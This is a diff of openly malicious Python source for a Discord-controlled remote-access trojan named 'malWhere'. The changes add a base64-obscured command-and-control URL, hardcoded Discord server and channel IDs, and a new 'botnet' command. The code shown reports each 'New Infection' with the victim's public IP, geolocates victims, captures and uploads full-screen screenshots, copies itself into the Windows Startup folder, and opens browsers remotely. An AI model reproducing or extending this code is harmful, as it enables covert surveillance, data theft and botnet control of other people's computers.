@@ -11,8 +11,9 @@ import psutil
 import PIL
 from PIL import ImageGrab
 from functools import partial
-
-encryptedapi=""
+from scapy.all import ARP, Ether, srp
+conf.L3Socket= L3RawSocket; 
+encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -23,33 +24,32 @@ encryptedtoken=tokenjson["token"]
 base64_string =encryptedtoken
 count=0
 maximum=5
-
 while count<maximum:
   base64_bytes = base64_string.encode("ascii")
   sample_string_bytes = base64.b64decode(base64_bytes)
   decryp1 = sample_string_bytes.decode("ascii")
   base64_string=decryp1
   count=count+1
-
 TOKEN=base64_string
 
 persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
 if not persistencefile:
   shutil.copy(__file__,"startup.py")
 
-malWhere = commands.Bot(command_prefix='$')
-malWhere.remove_command('help')
-
 r = requests.get('https://api.ipify.org?format=json')
 response=r.json()
 ip=response["ip"]
 ip4chan=ip.replace(".","")
 
+botnet_flag=False
+malWhere = commands.Bot(command_prefix='$')
+malWhere.remove_command('help')
+
 @malWhere.event
 async def on_ready():
-  guild = malWhere.get_guild()
+  guild = malWhere.get_guild(874824520467349504)
   try:
-    infectionschannel=malWhere.get_channel()
+    infectionschannel=malWhere.get_channel(874824520693874756)
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
     if not existing_channel:
       embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
@@ -101,28 +101,27 @@ async def geolocate(ctx):
       embed.add_field(name="POST CODE", value=response["postal"], inline=False)
       await ctx.send(embed=embed)
       await ctx.message.delete()
-    else:
-      await ctx.channel.send("wrong channel skid")
   except Exception as e:
     await ctx.send(f"An Error Has Occured Please Try Again {e}")
-    await ctx.message.delete())
+    await ctx.message.delete()
 
 @malWhere.command()
 async def screenshot(ctx):
   try:
-    guild = malWhere.get_guild()
-    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
-    existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
-    if not existing_channel:
-      await guild.create_text_channel(f"{ip4chan}-media")
-    channel_id = existing_channel.id
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save(r'tempimage.png')
-    with open('tempimage.png', 'rb') as f:
-      picture = discord.File(f)
-      mediachan=malWhere.get_channel(channel_id)
-      await mediachan.send(file=picture)
-      await ctx.message.delete()
+    if str(ctx.channel)==(ip4chan):
+      guild = malWhere.get_guild(874824520467349504)
+      ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
+      existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
+      if not existing_channel:
+        await guild.create_text_channel(f"{ip4chan}-media")
+      channel_id = existing_channel.id
+      myScreenshot = pyautogui.screenshot()
+      myScreenshot.save(r'tempimage.png')
+      with open('tempimage.png', 'rb') as f:
+        picture = discord.File(f)
+        mediachan=malWhere.get_channel(channel_id)
+        await mediachan.send(file=picture)
+        await ctx.message.delete()
   except Exception as e:
     await ctx.send(f"An Error Has Occured Please Try Again {e}")
     await ctx.message.delete()
@@ -154,26 +153,47 @@ async def rickroll(ctx):
     existing_chrome="C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
     if existing_chrome:
       os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-      
     existing_opera=f"C:/Users/{getpass.getuser()}/AppData/Local/Opera Software"
     if existing_opera:
       os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-      
     existing_firefox="C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
     if existing_firefox:
       os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-      
     existing_brave="C:/Users/jorda/AppData/Local/BraveSoftware/Brave-Browser"
     if existing_brave:
-      os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-      
+      os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ") 
     existing_edge="C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
     if existing_edge:
-      os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-      
+      os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ") 
     await ctx.message.delete()
   except Exception as e:
     await ctx.send(f"An Error Has Occured Please Try Again {e}")
     await ctx.message.delete()
+
+@malWhere.command()
+async def botnet(ctx,status):
+  try:
+    if str(ctx.channel)==(ip4chan):
+      botnet_channel=malWhere.get_channel(931748491078811698)
+      global botnet_flag
+      if status=="enable":
+        if botnet_flag:
+          await ctx.send("Botnet Mode Already Enabled")
+        else:
+          if not botnet_flag:
+            botnet_flag=True
+            await botnet_channel.send(f"{ip} has joined the botnet")
+          else:
+            if status=="disable":
+              if botnet_flag==False:
+                await ctx.send("Botnet Mode Already Disabled")
+              else:
+                if botnet_flag==True:
+                  botnet_flag=False
+                  await botnet_channel.send(f"{ip} has left the botnet")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
+  await ctx.message.delete()
 
 malWhere.run(TOKEN)
